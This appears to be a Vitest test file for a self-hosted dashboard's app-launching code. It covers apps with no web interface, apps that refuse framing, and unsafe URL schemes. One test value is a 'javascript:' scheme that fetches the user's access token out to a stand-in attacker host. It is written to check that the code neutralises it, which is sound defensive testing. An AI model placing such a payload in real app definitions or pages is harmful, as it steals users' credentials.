// @vitest-environment happy-dom
import { describe, expect, it, vi } from 'vitest'
import mixin from './Business_OpenThirdApp'

// An app says where its web interface is with a published port or an index. A stack
// written by hand says neither -- and once the dashboard started receiving its real
// status, clicking it stopped falling into the "not running" branch and started
// building a URL out of those empty fields. `hostname` is defaulted to the box's own
// address before the card ever sees it, so the URL came out as `http://<the box>`:
// the dashboard, opened inside the dashboard.
function harness(overrides = {}) {
	const calls = { opened: [], launcher: [], toasts: [], removed: [] }
	const ctx = {
		...mixin.methods,
		$t: (s, params) => (params ? s.replace('{name}', params.name) : s),
		$messageBus: vi.fn(),
		$baseIp: '192.168.1.50',
		$buefy: { toast: { open: o => calls.toasts.push(o) } },
		$EventBus: { $emit: (event, payload) => calls.launcher.push([event, payload]) },
		$store: { state: { appLaunchInIframe: true, appLaunchExceptions: [] } },
		hasNewTag: () => false,
		removeIdFromSessionStorage: name => calls.removed.push(name),
		...overrides,
	}
	return { ctx, calls }
}

describe('opening an app that has no web interface', () => {
	const handWritten = { name: 'gluetun-stack', status: 'running', hostname: '192.168.1.50' }

	it('says so instead of opening the dashboard inside itself', () => {
		const { ctx, calls } = harness()
		const open = vi.spyOn(window, 'open').mockImplementation(() => null)

		ctx.openAppToNewWindow(handWritten)

		expect(open).not.toHaveBeenCalled()
		expect(calls.launcher).toHaveLength(0)
		expect(calls.toasts).toHaveLength(1)
		expect(calls.toasts[0].message).toContain('gluetun-stack')
		open.mockRestore()
	})

	it('does not park the app launcher on a URL that will never answer', () => {
		const { ctx, calls } = harness()

		ctx.firstOpenThirdApp(handWritten)

		// the NEW tag is still cleared: the app was opened, it just had nothing to show
		expect(calls.removed).toEqual(['gluetun-stack'])
		expect(calls.launcher).toHaveLength(0)
		expect(calls.toasts).toHaveLength(1)
	})

	it('still opens an app that publishes a port', () => {
		const { ctx, calls } = harness()
		const open = vi.spyOn(window, 'open').mockImplementation(() => null)

		ctx.openAppToNewWindow({ name: 'syncthing', status: 'running', hostname: '192.168.1.50', port: '8384', index: '' })

		expect(calls.toasts).toHaveLength(0)
		expect(calls.launcher[0][1].url).toBe('http://192.168.1.50:8384')
		open.mockRestore()
	})

	it('still opens an app that publishes only an index', () => {
		const { ctx, calls } = harness()

		ctx.openAppToNewWindow({ name: 'proxied', status: 'running', hostname: 'apps.example.org', scheme: 'https', port: '', index: '/web' })

		expect(calls.toasts).toHaveLength(0)
		expect(calls.launcher[0][1].url).toBe('https://apps.example.org/web')
	})
})

describe('opening an app the box found refusing a frame', () => {
	it('goes to a tab, inside the click', async () => {
		const { rememberFrameRefused, forgetFrameChecks } = await import('./frameCheck')
		rememberFrameRefused('https://192.168.1.50:8443/nifi/')
		const { ctx, calls } = harness()
		const open = vi.spyOn(window, 'open').mockImplementation(() => null)

		ctx.openAppToNewWindow({ name: 'nifi', status: 'running', hostname: '192.168.1.50', scheme: 'https', port: '8443', index: '/nifi/' })

		expect(open).toHaveBeenCalledWith('https://192.168.1.50:8443/nifi/', '_blank')
		expect(calls.launcher.map(([event]) => event)).not.toContain('openAppIframe')
		open.mockRestore()
		forgetFrameChecks()
	})
})

// The scheme is a field of the app's compose file, and the file may come from any
// store. Put in front of the address as it is, `javascript:...//` made an address
// the browser runs as a script, in the frame of the dashboard or in a tab it opens.
describe('opening an app whose scheme is not http or https', () => {
	// eslint-disable-next-line no-template-curly-in-string -- a script, as a store could write it
	const script = 'javascript:fetch(`//evil.example/${localStorage.access_token}`)//'

	it('opens its address over http, in the frame', () => {
		const { ctx, calls } = harness()

		ctx.openAppToNewWindow({ name: 'trap', status: 'running', hostname: '192.168.1.50', scheme: script, port: '8080', index: '/' })

		expect(calls.launcher[0][1].url).toBe('http://192.168.1.50:8080/')
	})

	it('opens its address over http, in a tab', () => {
		const { ctx } = harness({ $store: { state: { appLaunchInIframe: false, appLaunchExceptions: [] } } })
		const open = vi.spyOn(window, 'open').mockImplementation(() => null)

		ctx.openAppToNewWindow({ name: 'trap', status: 'running', hostname: '192.168.1.50', scheme: script, port: '8080', index: '/' })

		expect(open).toHaveBeenCalledWith('http://192.168.1.50:8080/', '_blank')
		open.mockRestore()
	})

	it('keeps https, however it is written', () => {
		const { ctx, calls } = harness()

		ctx.openAppToNewWindow({ name: 'proxied', status: 'running', hostname: 'apps.example.org', scheme: 'HTTPS', port: '', index: '/web' })

		expect(calls.launcher[0][1].url).toBe('https://apps.example.org/web')
	})
})
